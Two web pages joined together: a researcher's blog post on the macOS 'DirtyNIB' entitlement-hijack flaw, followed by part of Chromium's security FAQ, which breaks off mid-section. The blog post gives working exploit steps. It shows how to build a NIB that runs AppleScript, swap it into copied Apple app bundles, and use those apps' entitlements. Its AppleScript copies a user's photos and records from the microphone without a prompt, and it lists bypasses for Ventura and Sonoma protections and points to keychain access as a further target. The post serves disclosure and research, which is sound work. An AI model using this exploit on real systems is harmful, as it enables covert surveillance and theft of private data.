=== Content from blog.xpnsec.com_b450a3bb_20250114_223619.html ===

[![avatar](/images/profile-image.jpg)](https://blog.xpnsec.com)
[XPN's InfoSec Blog](https://blog.xpnsec.com)

Adam Chester

Hacker and Infosec Researcher

## [XPN InfoSec Blog](https://blog.xpnsec.com "XPN InfoSec Blog")

[« Back to home](https://blog.xpnsec.com "Back to homepage")
# [MacOS "DirtyNIB" Vulnerability](/dirtynib/)

Posted on
2023-10-04

Tagged in
[macos](/tags#macos), [exploit](/tags#exploit)

While looking for avenues of injecting code into platform binaries back in macOS Monterey, I was able to identify a vulnerability which allowed the hijacking of Apple application entitlements.

Recently I decided to revisit this vulnerability after a long time of trying to have it patched, and was surprised to see that it still works. There are some caveats introduced with later versions of macOS which we will explore, but in this post we’ll look at a vulnerability in macOS Sonoma which has been around for a long time, and remains an 0day, urm, to this day… let’s dig in.

## The Vulnerability

Let’s waste no time with this. Graphical applications in macOS typically will have a UI defined by a NIB file. You’ve likely played around with these files in XCode before in the form of a XIB which is later compiled to a NIB during release:

![](https://assets.xpnsec.com/dirtynib/image1.png)

It turns out that swapping out NIB files in bundles doesn’t invalidate access to entitlements once the app has been verified by Gatekeeper. This usually wouldn’t be too much of an issue… so you’re able to reskin an application after it has been deployed.. big deal? Well, not exactly. It’s actually pretty trivial to get code execution via a modified NIB, and Apple like to add private entitlements to their apps.

## DirtyNIB

Something that I’ve been calling “DirtyNIB” for a few years is a simple method of gaining code execution from within a NIB file and it works like this.

First we need to create a new NIB file, we’ll use XCode for the bulk of the construction. We start by adding an Object to the interface and set the class to NSAppleScript:

![](https://assets.xpnsec.com/dirtynib/image2.png)

For the object we need to set the initial `source` property, which we can do using User Defined Runtime Attributes:

![](https://assets.xpnsec.com/dirtynib/image3.png)

This sets up our code execution gadget, which is just going to run AppleScript on request. To actually trigger the execution of the AppleScript, we’ll just add in a button for now (you can of course get creative with this ;). The button will bind to the `Apple Script` object we just created, and will invoke the `executeAndReturnError:` selector:

![](https://assets.xpnsec.com/dirtynib/image4.png)

For testing we’ll just use the Apple Script of:

```
set theDialogText to "PWND"
display dialog theDialogText
```

And if we run this in XCode debugger and hit the button:

![](https://assets.xpnsec.com/dirtynib/image5.png)

With our ability to execute arbitrary AppleScript code from a NIB, we next need a target. Let’s choose Pages for our initial demo, which is of course an Apple application and certainly shouldn’t be modifiable by us.

We’ll first take a copy of the application into `/tmp/`:

```
cp -a -X /Applications/Pages.app /tmp/
```

Then we’ll launch the application to avoid any Gatekeeper issues and allow things to be cached:

```
open -W -g -j /Applications/Pages.app
```

After launching (and killing) the app the first time, we’ll need to overwrite an existing NIB file with our DirtyNIB file. For demo purposes, we’re just going to overwrite the About Panel NIB so we can control the execution:

```
cp /tmp/Dirty.nib /tmp/Pages.app/Contents/Resources/Base.lproj/TMAAboutPanel.nib
```

Once we’ve overwritten the nib, we can trigger execution by selecting the `About` menu item:

![](https://assets.xpnsec.com/dirtynib/image6.png)

If we look at Pages a bit closer, we see that it has a private entitlement to allow access to a users Photos:

![](https://assets.xpnsec.com/dirtynib/image7.png)

So we can put our POC to the test by modifying our AppleScript to steal photos from the user without prompting:

```
use framework "Cocoa"
use framework "Foundation"

set grabbed to current application's NSData's dataWithContentsOfFile:"/Users/xpn/Pictures/Photos Library.photoslibrary/originals/6/68CD9A98-E591-4D39-B038-E1B3F982C902.gif"

grabbed's writeToFile:"/Users/xpn/Library/Containers/com.apple.iWork.Pages/Data/wtf.gif" atomically:1
```

And when run:

With the basic premise shown, let’s look at some caveats that have been introduced with subsequent versions of macOS before we get into the fun stuff.

## Then Along Came Ventura

So this bug was working well for a while.. and then along came Ventura. And with it, Launch Constraints. So what is a Launch Constraint? Well this was Apple’s way of stopping us from using the previous trick of copying a platform bundle and it’s entitlements to `/tmp` and modifying assets. Essentially it killed a large wave of exploits in one swoop.

Let’s take a very quick detour to help understand how we can parse out the list of Launch Constraints in macOS. The database containing trusted hashes is found in:

```
/System/Volumes/Preboot/*/boot/*/usr/standalone/firmware/FUD/StaticTrustCache.img4
```

As the cache comes in the `img4` format, we first need to extract it using `img4tool`:

![](https://assets.xpnsec.com/dirtynib/image8.png)

With the cache extracted, we need to parse the content. I’ve created a script, `extract_trustcache.py` which can be found [here](https://gist.github.com/xpn/66dc3597acd48a4c31f5f77c3cc62f30) and will give us a list of CDHASH’s and `ConstraintCategory`‘s:

![](https://assets.xpnsec.com/dirtynib/image9.png)

If we want to know what each category means, we can refer to Linus Henze’s Gist [here](https://gist.github.com/LinusHenze/4cd5d7ef057a144cda7234e2c247c056).

Now we need to search for launch constraints with a value of `0`, which allow us to copy the contents for modification. There are a bunch of them of course, but for brevity, the ones that I found on macOS Ventura were:

```
/System/Library/Templates/Data/usr/libexec/cups/apple/ipp
/System/Library/Templates/Data/usr/libexec/cups/apple/smb
/System/Library/Templates/Data/usr/libexec/cups/filter/pstoappleps
/System/Library/Templates/Data/Library/Apple/System/Library/CoreServices/XProtect.app/Contents/MacOS/XProtect
/System/Library/Templates/Data/Library/Apple/System/Library/CoreServices/XProtect.app/Contents/MacOS/XProtectRemediatorAdload
/System/Library/Templates/Data/Library/Apple/System/Library/CoreServices/XProtect.app/Contents/MacOS/XProtectRemediatorGreenAcre
/System/Library/Templates/Data/Library/Apple/System/Library/CoreServices/XProtect.app/Contents/MacOS/XProtectRemediatorPirrit
/System/Library/Templates/Data/Library/Apple/System/Library/CoreServices/XProtect.app/Contents/MacOS/XProtectRemediatorDubRobber
/System/Library/Templates/Data/Library/Apple/System/Library/CoreServices/XProtect.app/Contents/MacOS/XProtectRemediatorMRTv3
/System/Library/Templates/Data/Library/Apple/System/Library/CoreServices/XProtect.app/Contents/MacOS/XProtectRemediatorTrovi
/System/Library/Templates/Data/Library/Apple/System/Library/CoreServices/XProtect.app/Contents/MacOS/XProtectRemediatorSnowDrift
/System/Library/Templates/Data/Library/Apple/System/Library/CoreServices/XProtect.app/Contents/MacOS/XProtectRemediatorSnowBeagle
/System/Library/Templates/Data/Library/Apple/System/Library/CoreServices/XProtect.app/Contents/MacOS/XProtectRemediatorEicar
/System/Library/Templates/Data/Library/Apple/System/Library/CoreServices/XProtect.app/Contents/MacOS/XProtectRemediatorWaterNet
/System/Library/Templates/Data/Library/Apple/System/Library/CoreServices/XProtect.app/Contents/MacOS/XProtectRemediatorGenieo
/System/Library/Templates/Data/Library/Apple/System/Library/CoreServices/XProtect.app/Contents/MacOS/XProtectRemediatorSheepSwap
/System/Library/Templates/Data/Library/Apple/System/Library/CoreServices/XProtect.app/Contents/MacOS/XProtectRemediatorToyDrop
/System/Library/Templates/Data/Library/Apple/System/Library/CoreServices/XProtect.app/Contents/XPCServices/XProtectPluginService.xpc/Contents/MacOS/XProtectPluginService
/System/Library/Templates/Data/Library/Apple/System/Library/PrivateFrameworks/MobileDevice.framework/Versions/A/AppleMobileDeviceHelper.app/Contents/MacOS/AppleMobileDeviceHelper
/System/Library/Templates/Data/Library/Apple/System/Library/PrivateFrameworks/MobileDevice.framework/Versions/A/AppleMobileDeviceHelper.app/Contents/Resources/MDCrashReportTool
/System/Library/Templates/Data/Library/Apple/System/Library/PrivateFrameworks/MobileDevice.framework/Versions/A/AppleMobileDeviceHelper.app/Contents/Resources/AppleMobileBackup
/System/Library/Templates/Data/Library/Apple/System/Library/PrivateFrameworks/MobileDevice.framework/Versions/A/Resources/MobileDeviceUpdater.app/Contents/MacOS/MobileDeviceUpdater
/System/Library/Templates/Data/Library/Apple/System/Library/PrivateFrameworks/MobileDevice.framework/Versions/A/AppleMobileSync.app/Contents/MacOS/AppleMobileSync
/System/Library/Templates/Data/Library/Image Capture/Support/LegacyDeviceDiscoveryHelpers/AirScanLegacyDiscovery.app/Contents/MacOS/AirScanLegacyDiscovery
/System/Library/PrivateFrameworks/PrintingPrivate.framework/Versions/A/Plugins/PrinterProxy.app/Contents/MacOS/PrinterProxy
```

Of these binaries, we now need to narrow down candidates with entitlements that would be worth hijacking. At the time of searching, the most interesting was found in `MobileDeviceUpdater.app`:

![](https://assets.xpnsec.com/dirtynib/image10.png)

Unfortunately for us, the previous exploit demonstrated here is no longer viable due to additional requirements when in PkgKit.

So we need to find a new candidate.

## Finding a New Candidate

So we know that OS applications aren’t working anymore with Launch Constraints getting in the way. So we need to search for other Apple binaries with entitlements. One interesting set of binaries can be found in the `Additional_Tools_for_Xcode_15_Release_Candidate.dmg` which can be downloaded from the Apple Developer website [here](https://developer.apple.com/download/all/).

Specifically we’ll take the `CarPlay Simulator.app` bundle from the DMG, which has the ability to record from the microphone without prompting:

![](https://assets.xpnsec.com/dirtynib/image11.png)

To actually make a recording using our DirtyNib file, we will use the AppleScript of:

```
use framework "Cocoa"
use framework "Foundation"

property nil : missing value

use framework "AVFAudio"

set a to current application's NSURL's fileURLWithPath:"/tmp/recording.aac"
set b to current application's AVAudioSession's sharedInstance
set c to current application's AVAudioSessionCategoryPlayAndRecord
set settings to (current application's NSDictionary's dictionaryWithContentsOfFile:"/tmp/output.plist")
set p1 to 1
set p2 to a reference to p1

set p3 to {1.651469415E+9, 2.037412713E+9, 0}
set p4 to a reference to p3

current application's AudioObjectSetPropertyData(1, p3, 0, 0, 4, p1)

tell (current application's AVAudioRecorder's alloc's initWithURL:a settings:settings |error|:nil)
	its |prepareToRecord|
	its recordForDuration:10.0
end tell
```

The following serialized settings referenced within the AppleScript will need to be written to `/tmp/output.plist`:

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>AVFormatIDKey</key>
	<integer>1633772320</integer>
	<key>AVNumberOfChannelsKey</key>
	<integer>1</integer>
	<key>AVSampleRateKey</key>
	<real>16000</real>
</dict>
</plist>
```

When combined, accessing the microphone TCC entitlement will mean that we:

1. Take a copy of `CarPlay Simulator.app` to `/tmp/`
2. Launch the `CarPlay Simulator.app` to cache within Gatekeeper
3. Overwrite `Contents/Resources/Base.lproj/MainMenu.nib` with our `Dirty.nib` file
4. Launch `CarPlay Simulator.app` again

This should kick off a microphone recording using the `TCCServiceMicrophone` entitlement when you hit the button without prompting the user:

## And Now Along Comes Sonoma

So unfortunately we’re not done yet. In Sonoma, we have a few more hurdles we need to jump through. This is due to the new restrictions around accessing Application bundle contents without permission.

Luckily this is trivial to work around for our case. We simply introduce another few steps, but we can get it to work all the same:

1. Take a copy of `CarPlay Simulator.app` to `/tmp/`
2. Rename `/tmp/Carplay Simulator.app/Contents` to `/tmp/CarPlay Simulator.app/NotCon`
3. Launch the binary `/tmp/CarPlay Simulator.app/NotCon/MacOS/CarPlay Simulator` to cache within Gatekeeper
4. Overwrite `NotCon/Resources/Base.lproj/MainMenu.nib` with our `Dirty.nib` file
5. Rename to `/tmp/CarPlay Simulator.app/Contents`
6. Launch `CarPlay Simulator.app` again

This should be enough to work around the new protections and kick off our Dirty.nib exploit:

![](https://assets.xpnsec.com/dirtynib/image12.png)

Now this is one example of how we can apply this exploit, obviously this will work with any application which:

1. Has entitlements that you want to hijack
2. Works in the new Launch Constraints landscape

For example, many applications come with `keychain-access-groups` which are worth exploring ;)

![](https://assets.xpnsec.com/dirtynib/image13.png)

The hardest part will be figuring out how to get AppleScript to actually work!

The XIB file used throughout this post can be found [here](https://gist.github.com/xpn/16bfbe5a3f64fedfcc1822d0562636b4).

## Responsible Disclosure

OK, so why drop this now? Well, it’s certainly not without trying to have it patched! I first reported the issue to Apple back in November 2021. After exchanging MANY emails, I’ve had multiple confirmations that the issue would be patched. I’ve even had a CVE in the process (CVE-2022-48505).. but I’ve no idea what that actually fixes. If you want to see a preview of what it’s like to deal with Apple’s bug bounty program, check out my tweet’s [here](https://x.com/_xpn_/status/1673403955634905095?s=20).

Unfortunately at this stage.. I can’t imagine going through this process again to have this fixed.

So here we are, if you manage to have this fixed with Apple, give me a shout :)



=== Content from chromium.googlesource.com_1836a9c6_20250114_223623.html ===
[![project logo](data:image/png;base64...)Chromium Docs](/chromium/src/%2B/refs/heads/main/docs/README.md)

* [Home](/chromium/src/%2B/refs/heads/main/docs/README.md)
* [Sitemap](/chromium/src/%2B/refs/heads/main/docs/README.md#document-index)
* [Getting Started](/chromium/src/%2B/refs/heads/main/docs/contributing.md)
* [Testing](/chromium/src/%2B/refs/heads/main/docs/testing/testing_in_chromium.md)
* [Design Docs](/chromium/src/%2B/refs/heads/main/docs/design/README.md)
* [Contact](https://www.chromium.org/contact/)
* [Bugs](https://www.chromium.org/for-testers/bug-reporting-guidelines/)
* [Style Guide](https://chromium.googlesource.com/chromium/src/%2B/main/styleguide/styleguide.md)
* [Markdown Syntax](https://gerrit.googlesource.com/gitiles/%2B/HEAD/Documentation/markdown.md)
* [Old Docs](https://www.chromium.org/Home/)
* [Search](https://source.chromium.org/chromium/chromium/src/%2B/main%3Adocs/)
# Chrome Security FAQ

## Contents

* [Process](#Process)

+ [Which bugs are valid for rewards under the Chrome Vulnerability Rewards program?](#Which-bugs-are-valid-for-rewards-under-the-Chrome-Vulnerability-Rewards-program)
+ [Why are security bugs hidden in the Chromium issue tracker?](#Why-are-security-bugs-hidden-in-the-Chromium-issue-tracker)
+ [Can you please un-hide old security bugs?](#Can-you-please-un_hide-old-security-bugs)
+ [Can I get advance notice about security bugs?](#Can-I-get-advance-notice-about-security-bugs)
+ [How can I know which fixes to include in my downstream project?](#How-can-I-know-which-fixes-to-include-in-my-downstream-project)
+ [Can I see these security bugs so that I can back-port the fixes to my downstream project?](#Can-I-see-these-security-bugs-so-that-I-can-back_port-the-fixes-to-my-downstream-project)
+ [How does the Chrome team determine severity of security bugs?](#How-does-the-Chrome-team-determine-severity-of-security-bugs)

* [Threat Model](#Threat-Model)

+ [Are timing attacks considered security vulnerabilities?](#Are-timing-attacks-considered-security-vulnerabilities)
+ [What if a Chrome component breaks an OS security boundary?](#What-if-a-Chrome-component-breaks-an-OS-security-boundary)
+ [What is Chrome's threat model for fingerprinting?](#What-is-Chrome_s-threat-model-for-fingerprinting)
+ [I found a phishing or malware site not blocked by Safe Browsing. Is this a security vulnerability?](#I-found-a-phishing-or-malware-site-not-blocked-by-Safe-Browsing_Is-this-a-security-vulnerability)
+ [I can download a file with an unsafe extension and it is not classified as dangerous - is this a security bug?](#I-can-download-a-file-with-an-unsafe-extension-and-it-is-not-classified-as-dangerous-is-this-a-security-bug)
+ [What about dangerous file types not listed in the file type policy?](#What-about-dangerous-file-types-not-listed-in-the-file-type-policy)
+ [I found a local file or directory that may be security-sensitive and is not blocked by File System Access API - is this a security bug?](#I-found-a-local-file-or-directory-that-may-be-security_sensitive-and-is-not-blocked-by-File-System-Access-API-is-this-a-security-bug)
+ [I can download a file with an unsafe extension but a different extension or file type is shown to the user - is this a security bug?](#I-can-download-a-file-with-an-unsafe-extension-but-a-different-extension-or-file-type-is-shown-to-the-user-is-this-a-security-bug)
+ [Extensions for downloaded files are not shown in a file dialog - is this a security bug?](#Extensions-for-downloaded-files-are-not-shown-in-a-file-dialog-is-this-a-security-bug)
+ [The wrong description for a file type is added by Chrome - is this a security bug?](#The-wrong-description-for-a-file-type-is-added-by-Chrome-is-this-a-security-bug)
+ [I can download a file and OS indicators for its provenance are not applied - is this a security bug?](#I-can-download-a-file-and-OS-indicators-for-its-provenance-are-not-applied-is-this-a-security-bug)
+ [I can cause a hard or soft link to be written to a directory bypassing normal OS blocks - is this a security bug?](#I-can-cause-a-hard-or-soft-link-to-be-written-to-a-directory-bypassing-normal-OS-blocks-is-this-a-security-bug)
+ [I can hijack a user gesture and trick a user into accepting a permission or downloading a file - is this a security bug?](#I-can-hijack-a-user-gesture-and-trick-a-user-into-accepting-a-permission-or-downloading-a-file-is-this-a-security-bug)
+ [Sandbox/CSP/etc... security properties are not inherited when navigating using the middle-click/contextual-menu - is this a security bug?](#Sandbox_CSP_etc_security-properties-are-not-inherited-when-navigating-using-the-middle_click_contextual_menu-is-this-a-security-bug)
+ [What is the threat model for Chrome for Testing?](#What-is-the-threat-model-for-Chrome-for-Testing)

* [Areas outside Chrome's Threat Model](#Areas-outside-Chrome_s-Threat-Model)

+ [Are privacy issues considered security bugs?](#Are-privacy-issues-considered-security-bugs)
+ [What are the security and privacy guarantees of Incognito mode?](#What-are-the-security-and-privacy-guarantees-of-Incognito-mode)
+ [Are XSS filter bypasses considered security bugs?](#Are-XSS-filter-bypasses-considered-security-bugs)
+ [Are denial of service issues considered security bugs?](#Are-denial-of-service-issues-considered-security-bugs)
+ [Why arent physically-local attacks in Chromes threat model?](#Why-arent-physically_local-attacks-in-Chromes-threat-model)
+ [Why arent compromised/infected machines in Chromes threat model?](#Why-arent-compromised_infected-machines-in-Chromes-threat-model)
+ [If a website can open an Android app via an intent is this a security bug?](#If-a-website-can-open-an-Android-app-via-an-intent-is-this-a-security-bug)
+ [Does entering JavaScript: URLs in the URL bar or running script in the developer tools mean there's an XSS vulnerability?](#Does-entering-JavaScript_URLs-in-the-URL-bar-or-running-script-in-the-developer-tools-mean-there_s-an-XSS-vulnerability)
+ [Does executing JavaScript from a bookmark or the Home button mean there's an XSS vulnerability?](#Does-executing-JavaScript-from-a-bookmark-or-the-Home-button-mean-there_s-an-XSS-vulnerability)
+ [Does executing JavaScript in a PDF file mean there's an XSS vulnerability?](#Does-executing-JavaScript-in-a-PDF-file-mean-there_s-an-XSS-vulnerability)
+ [Are PDF files static content in Chromium?](#Are-PDF-files-static-content-in-Chromium)
+ [Are non-committed URLs entered by the user considered URL spoofs?](#Are-non_committed-URLs-entered-by-the-user-considered-URL-spoofs)
+ [What about URL spoofs using Internationalized Domain Names (IDN)?](#What-about-URL-spoofs-using-Internationalized-Domain-Names-IDN)
+ [Chrome silently syncs extensions across devices. Is this a security vulnerability?](#Chrome-silently-syncs-extensions-across-devices_Is-this-a-security-vulnerability)
+ [Why aren't null pointer dereferences considered security bugs?](#Why-aren_t-null-pointer-dereferences-considered-security-bugs)
+ [Indexing a container out of bounds hits a \_\_libcpp\_verbose\_abort, is this a security bug?](#Indexing-a-container-out-of-bounds-hits-a-libcpp_verbose_abort_is-this-a-security-bug)
+ [Are stack overflows considered security bugs?](#Are-stack-overflows-considered-security-bugs)
+ [Are tint shader compiler Internal Compiler Errors considered security bugs?](#Are-tint-shader-compiler-Internal-Compiler-Errors-considered-security-bugs)
+ [Are enterprise admins considered privileged?](#Are-enterprise-admins-considered-privileged)
+ [Can I use EMET to help protect Chrome against attack on Microsoft Windows?](#Can-I-use-EMET-to-help-protect-Chrome-against-attack-on-Microsoft-Windows)
+ [Dangling pointers](#Dangling-pointers)

* [Certificates & Connection Indicators](#Certificates-Connection-Indicators)

+ [Where are the security indicators located in the browser window?](#Where-are-the-security-indicators-located-in-the-browser-window)
+ [Why does Chrome show a lock, even if my HTTPS connection is being proxied?](#Why-does-Chrome-show-a-lock_even-if-my-HTTPS-connection-is-being-proxied)
+ [Why can’t I select Proceed Anyway on some HTTPS error screens?](#Why-can_t-I-select-Proceed-Anyway-on-some-HTTPS-error-screens)
+ [How does key pinning interact with local proxies and filters?](#How-does-key-pinning-interact-with-local-proxies-and-filters)
+ [When is key pinning enabled?](#When-is-key-pinning-enabled)
+ [How does Certificate Transparency interact with local proxies and filters?](#How-does-Certificate-Transparency-interact-with-local-proxies-and-filters)
+ [Why are some web platform features only available in HTTPS page-loads?](#Why-are-some-web-platform-features-only-available-in-HTTPS-page_loads)
+ [Which origins are secure?](#Which-origins-are-secure)
+ [What's the story with certificate revocation?](#What_s-the-story-with-certificate-revocation)

* [Passwords & Local Data](#Passwords-Local-Data)

+ [What about unmasking of passwords with the developer tools?](#What-about-unmasking-of-passwords-with-the-developer-tools)
+ [Is Chrome's support for userinfo in HTTP URLs (e.g. http://user:password@example.com) considered a vulnerability?](#Is-Chrome_s-support-for-userinfo-in-HTTP-URLs-e_g_http_user_password_example_com_considered-a-vulnerability)
+ [Why does the Password Manager ignore for password fields?](#Why-does-the-Password-Manager-ignore-for-password-fields)
+ [Signing out of Chrome does not delete previously-synced data?](#Signing-out-of-Chrome-does-not-delete-previously_synced-data)
+ [Why doesn't the Password Manager save my Google password if I am using Chrome Sync?](#Why-doesn_t-the-Password-Manager-save-my-Google-password-if-I-am-using-Chrome-Sync)
+ [Does the Password Manager store my passwords encrypted on disk?](#Does-the-Password-Manager-store-my-passwords-encrypted-on-disk)
+ [If there's a way to see stored passwords without entering a password, is this a security bug?](#If-there_s-a-way-to-see-stored-passwords-without-entering-a-password_is-this-a-security-bug)
+ [On some websites, I can use passkeys without passing a lock screen or biometric challenge. Is this a security bug?](#On-some-websites_I-can-use-passkeys-without-passing-a-lock-screen-or-biometric-challenge_Is-this-a-security-bug)

* [Other](#Other)

+ [What is the security story for Service Workers?](#What-is-the-security-story-for-Service-Workers)
+ [What is the security story for Extensions?](#What-is-the-security-story-for-Extensions)
+ [What's the security model for Chrome Custom Tabs?](#What_s-the-security-model-for-Chrome-Custom-Tabs)
+ [How is security different in Chrome for iOS?](#How-is-security-different-in-Chrome-for-iOS)
+ [Are all Chrome updates important?](#Are-all-Chrome-updates-important)
+ [What older Chrome versions are supported?](#What-older-Chrome-versions-are-supported)
+ [I'm making a Chromium-based browser. How should I secure it?](#I_m-making-a-Chromium_based-browser_How-should-I-secure-it)
+ [How can I appeal a Safe Browsing warning?](#How-can-I-appeal-a-Safe-Browsing-warning)
## Process

### Which bugs are valid for rewards under the Chrome Vulnerability Rewards program?

Please see [the VRP FAQ page](/chromium/src/%2B/refs/heads/main/docs/security/vrp-faq.md).

### Why are security bugs hidden in the Chromium issue tracker?

We must balance a commitment to openness with a commitment to avoiding unnecessary risk for users of widely-used open source libraries.

### Can you please un-hide old security bugs?

Our goal is to open security bugs to the public once the bug is fixed and the fix has been shipped to a majority of users. However, many vulnerabilities affect products besides Chromium, and we don’t want to put users of those products unnecessarily at risk by opening the bug before fixes for the other affected products have shipped.

Therefore, we make all security bugs public within approximately 14 weeks of the fix landing in the Chromium repository. The exception to this is in the event of the bug reporter or some other responsible party explicitly requesting anonymity or protection against disclosing other particularly sensitive data included in the vulnerability report (e.g. username and password pairs).

### Can I get advance notice about security bugs?

Vendors of products based on Chromium, distributors of operating systems that bundle Chromium, and individuals and organizations that significantly contribute to fixing security bugs can be added to a list for earlier access to these bugs. You can email us at security@chromium.org to request to join the list if you meet the above criteria. In particular, vendors of anti-malware, IDS/IPS, vulnerability risk assessment, and similar products or services do not meet this bar.

Please note that the safest version of Chrome/Chromium is always the latest stable version — there is no good reason to wait to upgrade, so enterprise deployments should always track the latest stable release. When you do this, there is no need to further assess the risk of Chromium vulnerabilities: we strive to fix vulnerabilities quickly and release often.

### How can I know which fixes to include in my downstream project?

Chrome is built with mitigations and hardening which aim to prevent or reduce the impact of security issues. We classify bugs as security issues if they are known to affect a version and configuration of Chrome that we ship to the public. Some classes of bug might present as security issues if Chrome was compiled with different flags, or linked against a different C++ standard library, but do not with the toolchain and configuration that we use to build Chrome. We discuss some of these cases elsewhere in this FAQ.

If we become aware of them, these issues may be triaged as `Type=Vulnerability, Security_Impact-None` or as `Type=Bug` because they do not affect the production version of Chrome. They may or may not be immediately visible to the public in the bug tracker, and may or may not be identified as security issues. If fixes are landed, they may or may not be merged from HEAD to a release branch. Chrome will only label, fix and merge security issues in Chrome, but attackers can still analyze public issues, or commits in the Chromium project to identify bugs that might be exploitable in other contexts.

Chromium embedders and other downstream projects may build with different compilers, compile options, target operating systems, standard library, or additional software components. It is possible that some issues Chrome classifies as functional issues will manifest as security issues in a product embedding Chromium - it is the responsibility of any such project to understand what code they are shipping, and how it is compiled. We recommend using Chrome's [configuration](https://source.chromium.org/chromium/chromium/src/%2B/main%3Abuild/config/) whenever possible.

### Can I see these security bugs so that I can back-port the fixes to my downstream project?

Many developers of other projects use V8, Chromium, and sub-components of Chromium in their own projects. This is great! We are glad that Chromium and V8 suit your needs.

We want to open up fixed security bugs (as described in the previous answer), and will generally give downstream developers access sooner. **However, please be aware that backporting security patches from recent versions to old versions cannot always work.** (There are several reasons for this: The patch won‘t apply to old versions; the solution was to add or remove a feature or change an API; the issue may seem minor until it’s too late; and so on.) We believe the latest stable versions of Chromium and V8 are the most stable and secure. We also believe that tracking the latest stable upstream is usually less work for greater benefit in the long run than backporting. We strongly recommend that you track the latest stable branches, and we support only the latest stable branch.

### How does the Chrome team determine severity of security bugs?

See the [severity guidelines](/chromium/src/%2B/refs/heads/main/docs/security/severity-guidelines.md) for more information. Only security issues are considered under the security vulnerability rewards program. Other types of bugs, which we call “functional bugs”, are not.

## Threat Model

### Are timing attacks considered security vulnerabilities?

Some timing attacks are considered security vulnerabilities, and some are considered privacy vulnerabilities. Timing attacks vary significantly in terms of impact, reliability, and exploitability.

Some timing attacks weaken mitigations like ASLR (e.g. [Issue 665930](https://crbug.com/665930)). Others attempt to circumvent the same origin policy, for instance, by using SVG filters to read pixels cross-origin (e.g. [Issue 686253](https://crbug.com/686253) and [Issue 615851](https://crbug.com/615851)).

Many timing attacks rely upon the availability of high-resolution timing information [Issue 508166](https://crbug.com/508166); such timing data often has legitimate usefulness in non-attack scenarios making it unappealing to remove.

Timing attacks against the browser‘s HTTP Cache (like [Issue 74987](https://crbug.com/74987)) can potentially leak information about which sites the user has previously loaded. The browser could attempt to protect against such attacks (e.g. by bypassing the cache) at the cost of performance and thus user-experience. To mitigate against such timing attacks, end-users can delete browsing history and/or browse sensitive sites using Chrome’s Incognito or Guest browsing modes.

Other timing attacks can be mitigated via clever design changes. For instance, [Issue 544765](https://crbug.com/544765) describes an attack whereby an attacker can probe for the presence of HSTS rules (set by prior site visits) by timing the load of resources with URLs “fixed-up” by HSTS. Prior to Chrome 64, HSTS rules [were shared](https://crbug.com/774643) between regular browsing and Incognito mode, making the attack more interesting. The attack was mitigated by changing Content-Security-Policy such that secure URLs will match rules demanding non-secure HTTP urls, a fix that has also proven useful to help to unblock migrations to HTTPS. Similarly, [Issue 707071](https://crbug.com/707071) describes a timing attack in which an attacker could determine what Android applications are installed; the attack was mitigated by introducing randomness in the execution time of the affected API.

### What if a Chrome component breaks an OS security boundary?

If Chrome or any of its components (e.g. updater) can be abused to perform a local privilege escalation, then it may be treated as a valid security vulnerability.

Running any Chrome component with higher privileges than intended is not a security bug and we do not recommend running Chrome as an Administrator on Windows, or as root on POSIX.

### What is Chrome's threat model for fingerprinting?

> **Update, August 2019:** Please note that this answer has changed. We have updated our threat model to include fingerprinting.

Although [we do not consider fingerprinting issues to be *security vulnerabilities*](#TOC-Are-privacy-issues-considered-security-bugs-), we do now consider them to be privacy bugs that we will try to resolve. We distinguish two forms of fingerprinting.

* **Passive fingerprinting** refers to fingerprinting techniques that do not require a JavaScript API call to achieve. This includes (but is not limited to) mechanisms like [ETag cookies](https://en.wikipedia.org/wiki/HTTP_ETag#Tracking_using_ETags) and [HSTS cookies](https://security.stackexchange.com/questions/79518/what-are-hsts-super-cookies).
* **Active fingerprinting** refers to fingerprinting techniques that do require a JavaScript API call to achieve. Examples include most of the techniques in [EFF's Panopticlick proof of concept](https://panopticlick.eff.org).

For passive fingerprinting, our ultimate goal is (to the extent possible) to reduce the information content available to below the threshold for usefulness.

For active fingerprinting, our ultimate goal is to establish a [privacy budget](https://github.com/bslassey/privacy-budget) and to keep web origins below the budget (such as by rejecting some API calls when the origin exceeds its budget). To avoid breaking rich web applications that people want to use, Chrome may increase an origin's budget when it detects that a person is using the origin heavily. As with passive fingerprinting, our goal is to set the default budget below the threshold of usefulness for fingerprinting.

These are both long-term goals. As of this writing (August 2019) we do not expect that Chrome will immediately achieve them.

For background on fingerprinting and the difficulty of stopping it, see [Arvind Narayanan's site](https://33bits.wordpress.com/about/) and [Peter Eckersley's discussion of the information theory behind Panopticlick](https://www.eff.org/deeplinks/2010/01/primer-information-theory-and-privacy). There is also [a pretty good analysis of in-browser fingerprinting vectors](https://dev.chromium.org/Home/chromium-security/client-identification-mechanisms).

### I found a phishing or malware site not blocked by Safe Browsing. Is this a security vulnerability?

Malicious sites not yet blocked by Safe Browsing can be reported via <https://www.google.com/safebrowsing/report_phish/>. Safe Browsing is primarily a blocklist of known-unsafe sites; the feature warns the user if they attempt to navigate to a site known to deliver phishing or malware content. You can learn more about this feature in these references:

* <https://developers.google.com/safe-browsing/>
* <https://www.google.com/transparencyreport/safebrowsing/>

In general, it is not considered a security bug if a given malicious site is not blocked by the Safe Browsing feature, unless the site is on the blocklist but is allowed to load anyway. For instance, if a site found a way to navigate through the blocking red warning page without user interaction, that would be a security bug. A malicious site may exploit a security vulnerability (for instance, spoofing the URL in the **Location Bar**). This would be tracked as a security vulnerability in the relevant feature, not Safe Browsing itself.

### I can download a file with an unsafe extension and it is not classified as dangerous - is this a security bug?

Chrome tries to warn users before they open files that might modify their system. What counts as a dangerous file will vary depending on the operating system Chrome is running on, the default set of file handlers, Chrome settings, Enterprise policy and verdicts on both the site and the file from [Safe Browsing](https://code.google.com/apis/safebrowsing/). Because of this it will often be okay for a user to download and run a file. However, if you can clearly demonstrate how to bypass one of these protections then we’d like to hear about it. You can see if a Safe Browsing check happened by opening [chrome://safe-browsing](/chromium/src/%2B/refs/heads/main/docs/security/chrome%3A//safe-browsing) before starting the download.

### What about dangerous file types not listed in the file type policy?

